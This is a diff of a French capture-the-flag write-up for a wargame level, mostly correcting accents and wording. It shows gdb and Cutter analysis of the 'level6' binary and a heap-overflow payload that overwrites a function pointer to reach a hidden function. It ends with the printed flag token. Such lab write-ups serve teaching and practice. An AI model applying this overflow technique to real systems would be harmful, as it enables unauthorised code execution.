@@ -1,8 +1,8 @@
 # Level6
 
-On observe un executable a la racine `level6`
+On observe un exécutable à la racine : `level6`
 
-```bash
+```shell
 $ ./level6
 Segmentation fault (core dumped)
 
@@ -10,9 +10,9 @@ $ ./level6 "Hello World"
 Nope
 ```
 
-On cherche donc a comprendre ce que fait l'executable
+On cherche donc à comprendre ce que fait l'exécutable
 
-```bash
+```shell
 $ gdb level6 -q
 Reading symbols from /home/user/level6/level6...(no debugging symbols found)...done.
 (gdb) set disassembly-flavor intel
@@ -67,22 +67,23 @@ Dump of assembler code for function m:
 End of assembler dump.
 ```
 
-On va utiliser `Cutter` pour avoir un idee plus clair de `level6`
+On va utiliser `Cutter` pour avoir une idée plus claire de `level6`
 
-```bash
+```shell
 $ scp -P 4242 -r level6@192.168.56.102:/home/user/level6/level6 .
 
 $ ./Cutter-v2.1.2-Linux-x86_64.AppImage level6
 ```
 
-_resultat sauvegarde dans [source.md](source.md)_
+_résultat sauvegardé dans [source.md](source.md)_
 
-On remarque que l'adresse de la fonction est stocke dans la variable `ppcVar2`.
-On cherche donc a modifier cette adresse pour pointer vers l'adresse de la fonction `n`
+On remarque un appel à `m`, une fonction qui nous retourne `Nope` ainsi qu'une fonction non appelée `n` qui print le token du niveau suivant.
+L'adresse de la fonction `m` est stocké dans la variable `ppcVar2`, qui est allouée sur la heap grâce à malloc.
+On cherche donc à modifier cette adresse pour pointer vers l'adresse de la fonction `n`
 
-On va recuperer le retour des deux malloc dans le main
+On récupère les adresses retournées par les deux malloc dans le main :
 
-```bash
+```shell
 (gdb) break *main+21
 Breakpoint 1 at 0x8048491
 (gdb) break *main+37
@@ -101,18 +102,12 @@ Breakpoint 2, 0x080484a1 in main ()
 eax            0x804a050    134520912
 ```
 
-On peut alors savoir le nombre d'octets qui les separes:
+On calcule le nombre d'octets qui les sépare:
 <code>0x804a050 - 0x804a008 = 48<sub>16</sub> = 72<sub>10</sub></code>
 
-On peut alors essayer d'ecrire par dessus l'adresse de `m` et mettre l'adresse de `n`: `0x08048454`
+On peut maintenant écrire par dessus l'adresse de `m` et mettre l'adresse de `n`: `0x08048454`
 
-```bash
+```shell
 $ ./level6 `python -c 'print ("A"*72 + "\x54\x84\x04\x08")'`
 f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
-
-
-level6:$ su level7
-Password:
-
-level7:$
 ```
